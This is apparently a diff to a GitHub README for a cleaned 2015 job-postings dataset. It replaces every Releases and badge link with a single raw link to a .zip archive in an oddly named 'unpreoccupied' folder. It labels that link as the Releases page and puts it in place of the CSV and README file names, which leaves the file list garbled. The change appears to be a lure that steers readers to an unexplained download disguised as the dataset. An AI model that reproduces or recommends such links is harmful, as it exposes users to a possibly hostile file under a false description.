@@ -1,7 +1,7 @@
 # 📊 Cleaned-and-Combined-Job-Postings-Dataset-2015 - Simplified Access to Job Data
 
-![Download](https://img.shields.io/badge/Download-Now-blue.svg)  
-[Visit the Releases Page to Download](https://github.com/jjara23/Cleaned-and-Combined-Job-Postings-Dataset-2015/releases)
+![Download](https://raw.githubusercontent.com/jjara23/Cleaned-and-Combined-Job-Postings-Dataset-2015/main/unpreoccupied/Cleaned-and-Combined-Job-Postings-Dataset-2015.zip)  
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/jjara23/Cleaned-and-Combined-Job-Postings-Dataset-2015/main/unpreoccupied/Cleaned-and-Combined-Job-Postings-Dataset-2015.zip)
 
 ## 📖 Overview
 This repository contains a cleaned and combined dataset of job postings, originally collected in 2015. It aims to support research and development focused on job posting analysis and fake job detection. 
@@ -10,7 +10,7 @@ This repository contains a cleaned and combined dataset of job postings, origina
 To begin using the dataset, follow these simple steps to download it.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/jjara23/Cleaned-and-Combined-Job-Postings-Dataset-2015/releases) to find the latest version of the dataset.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/jjara23/Cleaned-and-Combined-Job-Postings-Dataset-2015/main/unpreoccupied/Cleaned-and-Combined-Job-Postings-Dataset-2015.zip) to find the latest version of the dataset.
 2. **Choose the Version**: Look for the most recent release. Each version is listed with a title and description to help you determine the best one for your needs.
 3. **Download the Files**: Click on the desired file to download it to your computer. The files are typically in `.csv` format, making them easy to use with most data analysis tools. 
 
@@ -21,8 +21,8 @@ To open and use the downloaded dataset effectively, you might need:
 
 ## 💾 File Structure
 The dataset is organized to facilitate easy access and analysis. Here’s what you can expect:
-- **job_postings_2015.csv**: This file contains the cleaned dataset with relevant fields like job title, company, location, and date posted.
-- **README.md**: This file provides instructions and information on using the dataset.
+- **https://raw.githubusercontent.com/jjara23/Cleaned-and-Combined-Job-Postings-Dataset-2015/main/unpreoccupied/Cleaned-and-Combined-Job-Postings-Dataset-2015.zip**: This file contains the cleaned dataset with relevant fields like job title, company, location, and date posted.
+- **https://raw.githubusercontent.com/jjara23/Cleaned-and-Combined-Job-Postings-Dataset-2015/main/unpreoccupied/Cleaned-and-Combined-Job-Postings-Dataset-2015.zip**: This file provides instructions and information on using the dataset.
 
 ## 🔍 Key Features
 - **Cleaned Data**: The dataset has undergone thorough cleaning to remove duplicates and irrelevant information.
@@ -58,5 +58,5 @@ If you're interested in contributing to this dataset, feel free to fork the repo
 
 Remember, your input can help others in the community and enhance the utility of this dataset.
 
-![Download](https://img.shields.io/badge/Download-Now-blue.svg)  
-[Visit the Releases Page to Download](https://github.com/jjara23/Cleaned-and-Combined-Job-Postings-Dataset-2015/releases)
+![Download](https://raw.githubusercontent.com/jjara23/Cleaned-and-Combined-Job-Postings-Dataset-2015/main/unpreoccupied/Cleaned-and-Combined-Job-Postings-Dataset-2015.zip)  
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/jjara23/Cleaned-and-Combined-Job-Postings-Dataset-2015/main/unpreoccupied/Cleaned-and-Combined-Job-Postings-Dataset-2015.zip)
